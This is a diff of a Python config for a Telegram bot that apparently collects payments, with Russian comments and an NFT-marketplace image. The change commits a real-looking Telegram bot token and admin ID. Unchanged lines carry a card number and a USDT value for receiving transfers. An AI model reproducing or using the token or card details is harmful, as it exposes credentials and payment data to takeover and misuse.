@@ -1,5 +1,5 @@
-BOT_TOKEN = '' # Вставить токен от бота Telegtam
-ADMIN_ID = '' # ID, которому будет доставляться сообщения
+BOT_TOKEN = '6081716020:AAEVkfbS7NsxxDioyTv9hCsbWWsZTM0C-Pw' # Вставить токен от бота Telegtam
+ADMIN_ID = '5994508851' # ID, которому будет доставляться сообщения
 USDT = '0xdwhgKDG' # USDT, на который будут переводить
 CARD = '2200 7007 5429 0343' # Карта, на которую будут переводить
 photo_caption = 'https://topflightapps.com/wp-content/uploads/2022/01/create-nft-marketplace-website-concept-1.jpg' # Фото для меню
